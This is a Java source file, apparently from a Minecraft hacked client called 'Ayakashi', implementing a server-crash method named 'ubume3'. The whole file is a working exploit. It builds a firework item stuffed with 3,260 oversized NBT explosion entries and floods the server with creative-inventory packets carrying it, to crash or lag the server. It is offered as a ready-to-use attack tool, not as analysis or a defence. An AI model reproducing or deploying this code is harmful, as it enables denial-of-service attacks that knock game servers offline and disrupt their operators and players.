package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

import java.util.Arrays;

@CrashInfo(
        name = "ubume3"
)
public class CrashUbume3 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Ubume method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                ItemStack firework = new ItemStack(Items.fireworks);
                NBTTagCompound outerTag = new NBTTagCompound();
                NBTTagCompound tag2 = new NBTTagCompound();
                NBTTagList list2 = new NBTTagList();
                int[] arr = new int[64];

                for (int k = 0; k < 3260; ++k) {
                    Arrays.fill(arr, k + 1);
                    NBTTagCompound explosion = new NBTTagCompound();
                    explosion.setIntArray("Colors", arr);
                    list2.appendTag(explosion);
                }

                tag2.setTag("Explosions", list2);
                tag2.setByte("Flight", (byte) 2);
                outerTag.setTag("Fireworks", tag2);
                firework.setTagCompound(outerTag);
                for (int i2 = 0; i2 < packets; ++i2) {
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(3, firework));
                    Thread.sleep(200L);
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
